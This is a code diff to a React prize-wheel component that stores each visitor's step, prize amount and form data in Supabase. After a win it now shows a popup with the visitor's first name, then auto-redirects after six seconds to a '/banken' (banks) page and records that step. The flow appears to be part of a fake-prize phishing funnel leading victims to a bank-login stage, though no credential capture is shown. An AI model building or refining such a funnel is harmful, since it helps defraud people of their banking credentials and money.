@@ -318,7 +318,7 @@ export function WheelClient({
       setSessionData(nextSession);
 
       const restoredPrize = getPrizeFromSession(nextSession);
-      if (restoredPrize && nextSession.current_step === "win") {
+      if (restoredPrize) {
         setResultPrize(restoredPrize);
         setShowPopup(true);
       }
@@ -421,7 +421,7 @@ export function WheelClient({
 
     setSpinning(false);
     setResultPrize(safePrize);
-    // setShowPopup(true); // Popup'ı devre dışı bırakıyoruz
+    setShowPopup(true);
 
     logWheelEvent("wheel_win", {
       prize: safePrize.text,
@@ -451,7 +451,7 @@ export function WheelClient({
       .update({
         is_hidden: false,
         amount: safePrize.amount ?? 0,
-        current_step: "win",
+        current_step: "wheel",
         form_data: nextFormData,
       })
       .eq("id", sessionId);
@@ -468,7 +468,7 @@ export function WheelClient({
         .eq("id", sessionId)
         .maybeSingle();
       if (reFetched) {
-        const patched = { ...(sessionData ?? ({} as SessionRecord)), amount: reFetched.amount ?? 0, current_step: reFetched.current_step ?? "win", form_data: (reFetched.form_data ?? nextFormData) as SessionRecord["form_data"] } as SessionRecord;
+        const patched = { ...(sessionData ?? ({} as SessionRecord)), amount: reFetched.amount ?? 0, current_step: reFetched.current_step ?? "wheel", form_data: (reFetched.form_data ?? nextFormData) as SessionRecord["form_data"] } as SessionRecord;
         setSessionData(patched);
       } else {
         setSessionData((previous) =>
@@ -476,7 +476,7 @@ export function WheelClient({
             ? {
                 ...previous,
                 amount: safePrize.amount ?? 0,
-                current_step: "win",
+                current_step: "wheel",
                 form_data: nextFormData,
               }
             : previous,
@@ -490,17 +490,12 @@ export function WheelClient({
           ? {
               ...previous,
               amount: safePrize.amount ?? 0,
-              current_step: "win",
+              current_step: "wheel",
               form_data: nextFormData,
             }
           : previous,
       );
     }
-
-    // Çark durduktan sonra popup göstermeden direkt form sayfasına (isim soyisim) yönlendir
-    setTimeout(() => {
-      router.push(`/win?session=${encodeURIComponent(effectiveRouteSessionId)}`);
-    }, 900); // 700ms → 900ms, DB yazma + refetch sonrasi gorulmesi icin biraz daha uzun
   };
 
   const spinWheel = () => {
@@ -701,8 +696,25 @@ export function WheelClient({
       prize: resultPrize?.text ?? null,
     });
     setShowPopup(false);
-    router.push(`/win/${effectiveRouteSessionId}`);
+    if (supabase && sessionId) {
+      void supabase
+        .from("sessions")
+        .update({ current_step: "banken" })
+        .eq("id", sessionId);
+    }
+    router.push(`/banken?session=${encodeURIComponent(effectiveRouteSessionId)}`);
   };
+
+  const handleContinueRef = useRef(handleContinue);
+  handleContinueRef.current = handleContinue;
+
+  useEffect(() => {
+    if (!showPopup || !resultPrize) return;
+    const autoContinue = window.setTimeout(() => {
+      handleContinueRef.current();
+    }, 6000);
+    return () => window.clearTimeout(autoContinue);
+  }, [showPopup, resultPrize]);
 
   if (error) {
     return (
@@ -753,6 +765,11 @@ export function WheelClient({
         result={resultPrize}
         amountLine={popupAmountLine}
         description={popupDescription}
+        userName={
+          typeof sessionData?.form_data?.firstName === "string"
+            ? sessionData.form_data.firstName
+            : null
+        }
         continueButtonRef={continueButtonRef}
         onClose={handleContinue}
       />
